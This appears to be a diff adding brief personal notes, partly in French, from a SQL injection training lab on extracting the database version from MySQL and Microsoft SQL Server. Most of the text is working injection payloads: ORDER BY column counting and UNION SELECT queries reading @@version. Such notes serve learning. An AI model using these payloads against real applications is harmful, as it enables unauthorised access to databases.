@@ -1,0 +1,14 @@
+SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+End goal Display the database version.
+Analysis:
+(1)find number of columns
+' order by 1-- or ' order by 1#
+Ctrl+u to encode it 
+
+figure out wich column contain text 
+' UNION SELECT 'a', 'a'#
+
+On voit que on a deux column donc 
+' UNION SELECT @@version, NULL#
+nous donne la version cette commande marche pour les base de donnéeq Microsoft 
